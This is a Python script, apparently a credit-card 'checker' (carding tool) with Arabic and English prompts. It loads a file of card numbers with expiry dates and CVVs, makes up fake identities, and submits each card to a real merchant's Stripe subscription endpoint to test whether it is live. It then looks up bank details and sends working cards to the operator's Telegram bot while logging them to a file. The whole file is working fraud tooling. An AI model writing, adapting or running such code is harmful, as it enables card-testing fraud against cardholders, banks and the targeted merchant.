import requests,os,time
try:
	from faker import Faker
except ModuleNotFoundError:
	print("- Module eror • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install faker')
try:
	import pyfiglet
except ModuleNotFoundError:
	print("- Module eror • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install pyfiglet')
try:
	import webbrowser
except ModuleNotFoundError:
	print("- Module eror • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install webbrowser')


logi = (pyfiglet.figlet_format('     K    I   L W A '));print('\033[1;31m'+logi);print('\033[1;30m='*60);webbrowser.open('https://t.me/Pythonln');logq = (pyfiglet.figlet_format('    C  H  K  VISA'));print('\033[1;33m'+logq);Id = input('- Enter ID Telegram • ادخل ايديك تلجرام -> ');token = input('- Enter Token Bot • ادخل توكن بوتك -> ')

po = input('- Enter Name Combo • ادخل اسم الكومبو -> ')
try:
	file = open(po, 'r').read().splitlines()
except FileNotFoundError:
	exit(f'\n\033[1;31m- No File With Name • لايوجد ملف بهذا الاسم -> [ {po} ]')

def St(kil):
	n,mm,yy,cvv=kil.split('|')
	if '20' in yy:
		yy = yy.replace('20','')
	print(n,'\n',mm,'\n',yy,'\n',cvv)
	f = Faker()
	u = f.user_agent()
	mail=str(f.email()).replace('example','gmail')
	name=str(f.name())
	frs = name.split(' ')[0]
	las = name.split(' ')[1]
	print('\n\033[1;30m',mail,'\n',name,'|',frs,'|',las,u)
	cookies = {
        "_ga": "GA1.1.478559500.1718418847",
        "_ga_4HXMJ7D3T6": "GS1.1.1718418846.1.1.1718419251.0.0.0",
        "_ga_KQ5ZJRZGQR": "GS1.1.1718418847.1.1.1718419283.0.0.0",
        "_gcl_au": "1.1.82229850.1718418847",
        "ci_session": "cf9fqehv7d1crq8qk91d4h88gqeduo6q",
        "optiMonkClientId": "46e544be-7283-dd23-9914-6f4df852ee60"
    }

	headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "authority": "www.lagreeod.com",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.lagreeod.com",
        "referer": "https://www.lagreeod.com/subscribe",
        "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": u,
        "x-requested-with": "XMLHttpRequest"
    }

	data = {
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "card[name]": "ahaha",
        "card[number]": n,
        "coupon": "10080",
        "email": mail,
        "firstname": frs,
        "lastname": las,
        "password": "Kilwa2003",
        "s1": "8",
        "stripe_customer": "",
        "subscription_type": "Weekly+Subscription",
        "sum": "28"
    }
    
	response = requests.post("https://www.lagreeod.com/register/validate_subscribe", data=data, headers=headers, cookies=cookies)
	text=response.text
	if 'message' in text:
		try:
			return response.json()['message']
		except:
			return text

for cc in file:
	ko = str(St(cc))
	if "Your card has insufficient funds." in ko:
		api = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()
		try:
			chh = api['scheme']
			ch = chh.upper()
		except:
			ch = 'False'
		try:
			typ = api['type']
			type = typ.upper()
		except:
			type = 'False'
		try:
			raa = api['brand']
			ra = raa.upper()
		except:
			ra = 'False'
		try:
			am = api['bank']['name']
			ame = am.upper()
		except:
			ame = 'False'
		try:
			co = api['country']['name']
			cou = co
		except:
			cou = 'False'
		try:
			emoji = api['country']['emoji']
		except:
			emoji = 'False'
		m = f'''
Approved Card ✅
- - - - - - - - - - - - - - - - - - - - - - -
CC -> {cc}
Gateway -> Stripe Charge 3.99 $⚡
Response -> Your card has insufficient funds.
- - - - - - - - - - - - - - - - - - - - - - -
Bin -> {cc[:6]}
Bin Info -> {ch} - {type} - {ra}
Bank -> {ame}
Counrty -> {cou} {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
Dev : @Lx0b2 '''
		requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(Id)+"&text="+str(m))
		bolnam = 'visaok.txt'
		open(bolnam,'a').write('\n'+m)
		print(f'''\033[1;32m {m}''')
		time.sleep(10)
	elif 'was declined' in ko or 'number' in ko:
		print(f'''\033[1;31m
Visa is Declined ✗
Visa = {cc}
Message = {ko}''')
		time.sleep(10)
	elif 'Retry later' in ko:
		print(f'''\033[1;31m{cc} | Retry later''')
		time.sleep(10)
	elif 'requires_action' in ko:
		api = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()
		try:
			chh = api['scheme']
			ch = chh.upper()
		except:
			ch = 'False'
		try:
			typ = api['type']
			type = typ.upper()
		except:
			type = 'False'
		try:
			raa = api['brand']
			ra = raa.upper()
		except:
			ra = 'False'
		try:
			am = api['bank']['name']
			ame = am.upper()
		except:
			ame = 'False'
		try:
			co = api['country']['name']
			cou = co
		except:
			cou = 'False'
		try:
			emoji = api['country']['emoji']
		except:
			emoji = 'False'
		requir = (f'''
Charged Card ✅
- - - - - - - - - - - - - - - - - - - - - - -
CC -> {cc}
Gateway -> Stripe Charge 3.99$ ⚡
Response -> 3D Secure Charged 
- - - - - - - - - - - - - - - - - - - - - - -
Bin -> {cc[:6]}
Bin Info -> {ch} - {type} - {ra}
Bank -> {ame}
Counrty -> {cou} {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
Dev : @Lx0b2 ''')
		print(requir)
		requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(Id)+"&text="+str(requir))
		time.sleep(10)
	else:
		api = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()
		try:
			chh = api['scheme']
			ch = chh.upper()
		except:
			ch = 'False'
		try:
			typ = api['type']
			type = typ.upper()
		except:
			type = 'False'
		try:
			raa = api['brand']
			ra = raa.upper()
		except:
			ra = 'False'
		try:
			am = api['bank']['name']
			ame = am.upper()
		except:
			ame = 'False'
		try:
			co = api['country']['name']
			cou = co
		except:
			cou = 'False'
		try:
			emoji = api['country']['emoji']
		except:
			emoji = 'False'
		m = f'''
Charged Card ✅
- - - - - - - - - - - - - - - - - - - - - - -
CC -> {cc}
Gateway -> Stripe Charge 3.99$ ⚡
Response -> {ko}
- - - - - - - - - - - - - - - - - - - - - - -
Bin -> {cc[:6]}
Bin Info -> {ch} - {type} - {ra}
Bank -> {ame}
Counrty -> {cou} {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
Dev : @Lx0b2 '''
		requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(Id)+"&text="+str(m))
		bolnam = 'visaok.txt'
		open(bolnam,'a').write('\n'+m)
		print(f'''\033[1;32m{m}''')
		time.sleep(10)
